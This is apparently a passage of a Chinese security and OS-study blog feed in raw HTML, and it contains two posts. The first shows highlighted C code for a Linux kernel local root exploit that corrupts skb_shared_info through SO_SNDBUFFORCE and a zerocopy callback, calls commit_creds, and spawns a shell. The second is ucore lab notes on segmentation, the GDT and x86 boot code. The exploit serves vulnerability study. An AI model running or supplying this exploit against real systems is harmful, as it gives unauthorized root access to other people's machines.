<span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> COMMIT_CREDS 0xffffffff810a4b80</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PREPARE_KERNEL_CRED 0xffffffff810a4f30</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> __attribute__((regparm(<span class="number">3</span>))) (* _commit_creds)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> __attribute__((regparm(<span class="number">3</span>))) (* _prepare_kernel_cred)(<span class="keyword">unsigned</span> <span class="keyword">long</span> cred);</span><br><span class="line"></span><br><span class="line">_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;</span><br><span class="line">_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line"> commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info_t</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint64_t</span> callback;        <span class="comment">// void (*callback)(struct ubuf_info *, bool)</span></span><br><span class="line">  <span class="keyword">uint64_t</span> ctx;             <span class="comment">// void *</span></span><br><span class="line">  <span class="keyword">uint64_t</span> desc;            <span class="comment">// unsigned long</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info_t</span> &#123;</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  nr_frags;        <span class="comment">// unsigned char</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  tx_flags;        <span class="comment">// __u8</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_size;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_segs;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint16_t</span> gso_type;        <span class="comment">// unsigned short</span></span><br><span class="line">  <span class="keyword">uint64_t</span> frag_list;       <span class="comment">// struct sk_buff *</span></span><br><span class="line">  <span class="keyword">uint64_t</span> hwtstamps;       <span class="comment">// struct skb_shared_hwtstamps</span></span><br><span class="line">  <span class="keyword">uint32_t</span> tskey;           <span class="comment">// u32</span></span><br><span class="line">  <span class="keyword">uint32_t</span> ip6_frag_id;     <span class="comment">// __be32</span></span><br><span class="line">  <span class="keyword">uint32_t</span> dataref;         <span class="comment">// atomic_t</span></span><br><span class="line">  <span class="keyword">uint64_t</span> destructor_arg;  <span class="comment">// void *</span></span><br><span class="line">  <span class="keyword">uint8_t</span>  frags[<span class="number">16</span>][<span class="number">17</span>];   <span class="comment">// skb_frag_t frags[MAX_SKB_FRAGS];</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sk_sndbuf = 0xffffff00 =&gt; skb_shinfo(skb) = 0x00000000fffffed0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SNDBUF 0xffffff00</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHINFO 0x00000000fffffed0ul</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ubuf_info_t</span> <span class="title">ubuf_info</span> = &#123;</span>(<span class="keyword">uint64_t</span>)&amp;get_root, <span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line"><span class="comment">//struct ubuf_info_t ubuf_info = &#123;0xffffdeaddeadbeeful, 0, 0&#125;;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">skb_shared_info_t</span> *<span class="title">skb_shared_info</span> = (<span class="title">struct</span> <span class="title">skb_shared_info_t</span> *)<span class="title">SHINFO</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SKBTX_DEV_ZEROCOPY (1 &lt;&lt; 3)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">skb_thr</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line"><span class="comment">//skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line">skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> sockets[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">write_thr</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Write blocks until setsockopt(SO_SNDBUF).</span></span><br><span class="line">write(sockets[<span class="number">1</span>], <span class="string">&quot;\x5c&quot;</span>, <span class="number">1</span>);</span><br><span class="line"><span class="comment">// skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line"><span class="comment">// skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span></span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] got r00t\n&quot;</span>);</span><br><span class="line">        execl(<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;sh&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">        perror(<span class="string">&quot;execl()&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// printf(&quot;[-] something went wrong\n&quot;);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">void</span> *addr;</span><br><span class="line"><span class="keyword">int</span> rv;</span><br><span class="line"><span class="keyword">uint32_t</span> sndbuf;</span><br><span class="line"></span><br><span class="line">addr = mmap((<span class="keyword">void</span> *)(SHINFO &amp; <span class="number">0xfffffffffffff000</span>ul), <span class="number">0x1000</span>ul,</span><br><span class="line">PROT_READ | PROT_WRITE, MAP_FIXED | MAP_ANONYMOUS | MAP_PRIVATE,</span><br><span class="line"><span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (addr != (<span class="keyword">void</span> *)(SHINFO &amp; <span class="number">0xfffffffffffff000</span>ul)) &#123;</span><br><span class="line">perror(<span class="string">&quot;mmap()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] userspace payload mmapped at %p\n&quot;</span>, addr);</span><br><span class="line"></span><br><span class="line"> <span class="keyword">pthread_t</span> skb_th;</span><br><span class="line">    rv = pthread_create(&amp;skb_th, <span class="number">0</span>, skb_thr, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;pthread_create()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// usleep(10000);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] overwriting thread started\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">rv = socketpair(AF_LOCAL, SOCK_STREAM, <span class="number">0</span>, &amp;sockets[<span class="number">0</span>]);</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;socketpair()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] sockets opened\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">sndbuf = SNDBUF;</span><br><span class="line">rv = setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUFFORCE,</span><br><span class="line">&amp;sndbuf, <span class="keyword">sizeof</span>(sndbuf));</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;setsockopt()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] sock-&gt;sk_sndbuf set to %x\n&quot;</span>, SNDBUF * <span class="number">2</span>);</span><br><span class="line"><span class="comment">// skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line"><span class="comment">// skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span></span><br><span class="line"><span class="comment">// write(sockets[1], &quot;\x5c&quot;, 1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// if (getuid() == 0) &#123;</span></span><br><span class="line"><span class="comment">// printf(&quot;[+] got r00t\n&quot;);</span></span><br><span class="line">    <span class="comment">//     system(&quot;/bin/sh&quot;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="keyword">pthread_t</span> write_th;</span><br><span class="line">rv = pthread_create(&amp;write_th, <span class="number">0</span>, write_thr, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;pthread_create()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">    usleep(<span class="number">10000</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[.] writing to socket\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//Wake up blocked write.</span></span><br><span class="line">rv = setsockopt(sockets[<span class="number">1</span>], SOL_SOCKET, SO_SNDBUF,</span><br><span class="line">&amp;sndbuf, <span class="keyword">sizeof</span>(sndbuf));</span><br><span class="line"><span class="keyword">if</span> (rv != <span class="number">0</span>) &#123;</span><br><span class="line">perror(<span class="string">&quot;setsockopt()&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//usleep(10000);</span></span><br><span class="line">    <span class="comment">// skb_shared_info-&gt;destructor_arg = (uint64_t)&amp;ubuf_info;</span></span><br><span class="line"><span class="comment">// skb_shared_info-&gt;tx_flags |= SKBTX_DEV_ZEROCOPY;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// if (getuid() == 0)</span></span><br><span class="line">    <span class="comment">// &#123;</span></span><br><span class="line">    <span class="comment">//     printf(&quot;[+] got r00t\n&quot;);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//     execl(&quot;/bin/sh&quot;, &quot;sh&quot;, NULL);</span></span><br><span class="line">    <span class="comment">//     perror(&quot;execl()&quot;);</span></span><br><span class="line">    <span class="comment">//     // system(&quot;/bin/sh&quot;);</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// close(sockets[0]);</span></span><br><span class="line"><span class="comment">// close(sockets[1]);</span></span><br><span class="line"><span class="comment">// void *status;</span></span><br><span class="line"><span class="comment">// pthread_join(write_th, &amp;status);</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;读一篇关于iot固件外设移植的paper时看到了有关该漏洞的描述，于是简要地看了一下，再此做一下记录&lt;/p&gt;
&lt;h1 id=&quot;漏洞成因&quot;&gt;&lt;a href=&quot;#漏洞成因&quot; class=&quot;headerlink&quot; title=&quot;漏洞成因&quot;&gt;&lt;/a&gt;漏洞成因&lt;/h1&gt;&lt;p&gt;在&lt;co</summary>
      
    
    
    
    
    <category term="kernel" scheme="http://phot0n.com/tags/kernel/"/>
    
    <category term="pwn" scheme="http://phot0n.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ucore-lab</title>
    <link href="http://phot0n.com/2023/04/17/ucore-lab/"/>
    <id>http://phot0n.com/2023/04/17/ucore-lab/</id>
    <published>2023-04-17T07:04:17.000Z</published>
    <updated>2023-10-15T13:57:36.374Z</updated>
    
    <content type="html"><![CDATA[<p>感觉自己开发经验很少，多以写脚本为主，没怎么接触过较为大型的项目，所以想搞点开发相关的经验。打算借ucore再回顾一下OS相关的知识。这个项目啃完之后打算看看南大的那个模拟的lab，然后学点C++逆向。</p><p>BASIC-KNOWLEDGE记得比较杂(因为感觉知识点很多都关联)，把LAB里面相关的知识点还有一些代码分析都写进去了，可以挑着看…</p><p>需要注意的是该OS针对的是x86下的,有些概念是x86独有的，64位下已不适用。</p><h1 id="BASIC-KNOWLEDGE"><a href="#BASIC-KNOWLEDGE" class="headerlink" title="BASIC-KNOWLEDGE"></a>BASIC-KNOWLEDGE</h1><h2 id="关于实模式和保护模式"><a href="#关于实模式和保护模式" class="headerlink" title="关于实模式和保护模式"></a>关于实模式和保护模式</h2><p>实模式和保护模式为CPU的工作模式，简单来说就是规定CPU寻址与工作的方式</p><h3 id="实模式及其工作原理"><a href="#实模式及其工作原理" class="headerlink" title="实模式及其工作原理"></a>实模式及其工作原理</h3><p>实模式出现于早期8088CPU。其产生的主要原因是为了更好地寻址。当时地CPU有20位地地址线，但是寄存器只有16位(8个通用寄存器，4个段寄存器)。为了能够完整地去访问20位的主存地址，人们构想出这样一个方案:当某条指令想要访存时，必须通过<strong>段基址:段偏移量</strong>的形式进行访问。</p><p>段基址由段寄存器提供，而段偏移量由通用寄存器来提供。我们之前说过，当时CPU的寄存器只有16位，我们通过段寄存器和通用寄存器的组合方式来达到20位，这种方式很容易想到，就是</p><script type="math/tex; mode=display">物理地址=段基址<<4+段偏移量</script><p>比如我们段寄存器中的值位0x1230,而段偏移量为0x0011，则对应的物理地址则为0x1230&lt;&lt;4+0x0011=0x12311</p><p>但是我们很容易发现这种寻址方式很不安全，随便一个程序就能修改别人的内存。</p><h2 id="保护模式"><a href="#保护模式" class="headerlink" title="保护模式"></a>保护模式</h2><p>随着CPU的发展，其地址线从原来的20根变为了32根，同时寄存器的位数也变为了32位。此时实模式下的内存地址计算方式已经不适合了，所以就引入了保护模式。</p><p>在保护模式下，CPU的32位地址线全部都有效(也就是说可以寻址4GB的物理地址空间)，但是我们内存寻址的方式还需要兼容老办法，也就是实模式下的寻址方法(段基址:段偏移量的形式)。</p><p>我们的偏移量其实和实模式下是一样的，除了位数有变化。主要大的变化在于段寄存器。此时段寄存器存放的不是段基址了，而是一个叫<strong>段选择子</strong>的东西，通过这个选择子，我们可以从<strong>描述符表(GDT或LDT)</strong>中获取对应的<strong>段描述符</strong></p><p><img src="https://s2.loli.net/2023/10/15/NOpAV4z1RJtjv8a.png" alt=""></p><p>其结构如下</p><ul><li><code>0-1</code>位为请求特权级</li><li><code>2</code>位为表指示位，代表了应该访问哪个描述符表</li><li><code>3-15</code>位代表索引。类似从数组中根据下标取元素一样，我们也可以通过索引在描述符表中获取描述符</li></ul><p>下面我们来说说描述符表，这里主要针对全局描述符表。<strong>全局描述符表(GDT)</strong> 是一个保存段描述符的数组，其起始地址保存在<strong>全局描述表寄存器(GDTR)</strong>中。GDTR长48位，其中高32位为基地址，低16位是段界限。</p><p>全局描述符表里面存的是段描述符</p><p><img src="https://s2.loli.net/2023/10/15/lE21Nx58WszOXRD.png" alt=""></p><p>一共有64位(这张图上下两个代表的不是两种结构，而是一个结构的前半段和后半段) 从类型上来说，主要分为3个部分:<code>段基址</code> ，<code>段界限</code>，<code>属性</code> 。但是观察这张图我们可以发现其实每个部分并不一定是连续的(比如段基址以及段界限就被拆成了两段)</p><p>简单来说，它就是一个64位的约定俗成的结构体，其结构如下</p><ul><li>低32位的<code>0-15</code>位，高32位的<code>16-19</code>位为段界限长</li><li>低32位的<code>16-31</code>位以及高32位的<code>0-7</code>、<code>24-31</code>位为段基址</li><li>高32位的<code>8-15</code>、<code>20-23</code>位代表着各种属性</li></ul><p>其用代码表示就是这样的,对应上面的图就能明白</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">gdt_entry</span> &#123;</span></span><br><span class="line">    <span class="keyword">uint16_t</span> limit_low;       </span><br><span class="line">    <span class="keyword">uint16_t</span> base_low;</span><br><span class="line">    <span class="keyword">uint8_t</span> base_middle;</span><br><span class="line">    <span class="keyword">uint8_t</span> access;</span><br><span class="line">    <span class="keyword">unsigned</span> limit_high: <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> flags: <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> base_high;</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><p>我们可以通过这样一个函数来设置一个段描述符</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gdt_install</span><span class="params">(<span class="keyword">uint8_t</span> num, <span class="keyword">uint32_t</span> base, <span class="keyword">uint32_t</span> limit, <span class="keyword">uint8_t</span> access, <span class="keyword">uint8_t</span> flags)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup the descriptor base address */</span></span><br><span class="line">    gdt[num].base_low = (base &amp; <span class="number">0xffff</span>);</span><br><span class="line">    gdt[num].base_middle = (base &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">    gdt[num].base_high = (base &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Setup the descriptor limits */</span></span><br><span class="line">    gdt[num].limit_low = (limit &amp; <span class="number">0xffff</span>);</span><br><span class="line">    gdt[num].limit_high = ((limit &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0x0f</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Finally, set up the granularity and access flags */</span></span><br><span class="line">    gdt[num].flags = flags;</span><br><span class="line"></span><br><span class="line">    access |= AC_RE; <span class="comment">// 设置保留位为1</span></span><br><span class="line">    gdt[num].access = access;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下就是，我们在保护模式下从逻辑地址到线性地址地过程是:</p><ul><li>先通过段寄存器中的段选择子获取索引，与段描述符表地基址相结合，获取段描述符</li><li>根据段描述符得到了段基址</li><li>通过段基址+偏移地址，得到了线性地址</li></ul><p>(这里补充一下地址的分类，地址分为<strong>逻辑地址</strong>，<strong>线性地址</strong>以及<strong>物理地址</strong> 。逻辑地址经过分段机制之后形成了线性地址，如果不启用分页的话，此时线性地址就是物理地址，而采用分页的话，线性地址经分页转换之后形成物理地址)</p><h2 id="关于启动"><a href="#关于启动" class="headerlink" title="关于启动"></a>关于启动</h2><p>电脑是如何启动一步步把控制权交给用户的，这是一个很多人都想过的问题。这里面我们需要注意的概念有这么几个:<code>BIOS</code>、<code>MBR/Bootloader</code>、<code>OS</code></p><h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p><code>BIOS</code>是ROM中的一段代码，其被映射到地址<code>0xF0000~0xFFFFF</code>。其入口地址为<code>0xFFFF0</code>。它主要提供这么几个功能:</p><ul><li>提供和硬件交互的接口(比如基本的输入输出功能)</li><li>硬件检测，读取硬件信息</li><li>查找并加载可启动设备</li></ul><h3 id="MBR"><a href="#MBR" class="headerlink" title="MBR"></a>MBR</h3><p>MBR全称为Master Boot Record（主引导记录)</p><p>当加电的一瞬间，CPU的CS:IP寄存器被强制初始化成了<code>0xF000:0xFFF0</code> </p><p><img src="https://s2.loli.net/2023/10/15/hVBb2RTpIXWiEN4.png" alt="image-20230428145341002"></p><p>这里其实是一个跳转指令，来跳转到BIOS真正的代码</p><p>进入BIOS进行一系列初始化之后，检查启动盘中位于0盘0道1扇区的内容，即检查扇区末尾是否是magic number <code>0x55</code>和<code>0xaa</code>，如果是的话则加载这一扇区的512字节到<code>0x7c00</code>然后跳转到此处执行</p><p><img src="https://s2.loli.net/2023/10/15/ckCa6zKbuSGTMeE.png" alt="image-20230428145757799"></p><p>这里便是我们Bootloader的开始。在目录boot/下查看bootasm.S文件可以发现，此时运行的代码便是我们bootasm.S中的代码</p><p><img src="https://s2.loli.net/2023/10/15/8nVJu9kDLI5HiqQ.png" alt="image-20230428145843753"></p><p>那么启动到bootasm之后怎么跳转到我们的内核呢，注意到在bootasm.c中会有如下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">protcseg:</span><br><span class="line">    # Set up the protected-mode data segment registers</span><br><span class="line">    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector</span><br><span class="line">    movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line"></span><br><span class="line">    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    movl $start, %esp</span><br><span class="line">    call bootmain</span><br></pre></td></tr></table></figure><p>调用了<code>bootmain</code>函数，而这个函数是我们在<code>bootmain.c</code>当中定义的，其定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* bootmain - the entry of bootloader */</span></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">bootmain(<span class="keyword">void</span>) &#123;</span><br><span class="line">    <span class="comment">// read the 1st page off disk</span></span><br><span class="line">    readseg((<span class="keyword">uintptr_t</span>)ELFHDR, SECTSIZE * <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// is this a valid ELF?</span></span><br><span class="line">    <span class="keyword">if</span> (ELFHDR-&gt;e_magic != ELF_MAGIC) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bad;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">proghdr</span> *<span class="title">ph</span>, *<span class="title">eph</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// load each program segment (ignores ph flags)</span></span><br><span class="line">    ph = (struct proghdr *)((<span class="keyword">uintptr_t</span>)ELFHDR + ELFHDR-&gt;e_phoff);</span><br><span class="line">    eph = ph + ELFHDR-&gt;e_phnum;</span><br><span class="line">    <span class="keyword">for</span> (; ph &lt; eph; ph ++) &#123;</span><br><span class="line">        readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// call the entry point from the ELF header</span></span><br><span class="line">    <span class="comment">// note: does not return</span></span><br><span class="line">    ((<span class="keyword">void</span> (*)(<span class="keyword">void</span>))(ELFHDR-&gt;e_entry &amp; <span class="number">0xFFFFFF</span>))();</span><br><span class="line"></span><br><span class="line">bad:</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8A00</span>);</span><br><span class="line">    outw(<span class="number">0x8A00</span>, <span class="number">0x8E00</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* do nothing */</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以着重关注一下这个<code>readseg</code>函数的实现。这个函数的作用是从某个扇区读取数据加载到内存当中。那么也当然可以加载我们的内核</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* *</span></span><br><span class="line"><span class="comment"> * readseg - read @count bytes at @offset from kernel into virtual address @va,</span></span><br><span class="line"><span class="comment"> * might copy more than asked.</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">readseg(<span class="keyword">uintptr_t</span> va, <span class="keyword">uint32_t</span> count, <span class="keyword">uint32_t</span> offset) &#123;</span><br><span class="line">    <span class="keyword">uintptr_t</span> end_va = va + count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// round down to sector boundary</span></span><br><span class="line">    va -= offset % SECTSIZE;</span><br><span class="line"><span class="comment">//因为我们要一个扇区一个扇区的读，所以需要让va减至和SECTSIZE对齐</span></span><br><span class="line">    <span class="comment">// translate from bytes to sectors; kernel starts at sector 1</span></span><br><span class="line">    <span class="keyword">uint32_t</span> secno = (offset / SECTSIZE) + <span class="number">1</span>;</span><br><span class="line"><span class="comment">//计算扇区的编号，需要注意的是从0开始</span></span><br><span class="line">    <span class="comment">// If this is too slow, we could read lots of sectors at a time.</span></span><br><span class="line">    <span class="comment">// We&#x27;d write more to memory than asked, but it doesn&#x27;t matter --</span></span><br><span class="line">    <span class="comment">// we load in increasing order.</span></span><br><span class="line">    <span class="keyword">for</span> (; va &lt; end_va; va += SECTSIZE, secno ++) &#123;</span><br><span class="line">        readsect((<span class="keyword">void</span> *)va, secno); <span class="comment">//调用readsect函数，每次读一个扇区</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>va</code>是我们存放数据的虚拟内存地址，<code>count</code>是数据大小，而<code>offset</code>则是所要读取的数据相对于磁盘开始的位置其中进行简单的数据处理之后调用<code>readsect</code>函数，每次一个扇区地读</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 